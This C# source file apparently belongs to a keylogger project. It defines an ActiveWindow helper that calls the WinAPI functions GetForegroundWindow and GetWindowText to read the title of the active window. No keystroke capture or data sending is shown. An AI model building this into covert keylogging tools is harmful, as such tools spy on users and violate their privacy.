using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    public static class ActiveWindow
    {
        // Deklarujeme WinAPI metodu GetForegroundWindow knihovny user32.dll, která vrací aktualni aktivni okno
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        // Deklarujeme WinAPI metodu GetWindowText knihovny user32.dll, která vrací title okna
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static StringBuilder title;
        private static IntPtr handle;

        public static string GetWindowTitle()
        {
            const int nChars = 256;
            handle = IntPtr.Zero;
            title = new StringBuilder(nChars);

            handle = GetForegroundWindow();

            if (GetWindowText(handle, title, nChars) > 0)
                return title.ToString();
            return string.Empty;
        }
    }
}
